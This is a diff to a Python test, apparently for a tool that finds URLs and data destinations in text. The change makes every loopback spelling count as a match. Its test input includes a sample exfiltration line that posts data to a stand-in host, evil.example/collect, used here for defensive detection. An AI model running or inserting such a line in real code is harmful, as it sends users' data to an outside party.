@@ -74,5 +74,7 @@ def test_urls_in_text_and_needles():
     text = "import requests\nrequests.post('https://Evil.Example/collect', data=x)  # see http://docs.example/a."
     assert [d.host for d in D.urls_in_text(text)] == ["evil.example", "docs.example"]
     assert D.normalise_url("https://www.evil.example/x").needles() == ["evil.example"]
-    assert D.normalise_url("http://127.0.0.1:9999/x").needles() == ["127.0.0.1:9999"]
+    # every spelling of the loopback host is a needle (a payload may name it as localhost or [::1])
+    assert D.normalise_url("http://127.0.0.1:9999/x").needles() == ["127.0.0.1:9999", "localhost:9999", "[::1]:9999",
+                                                                   "0.0.0.0:9999"]
     assert D.parse_destination("channel:discord:123456789").needles() == ["123456789"]
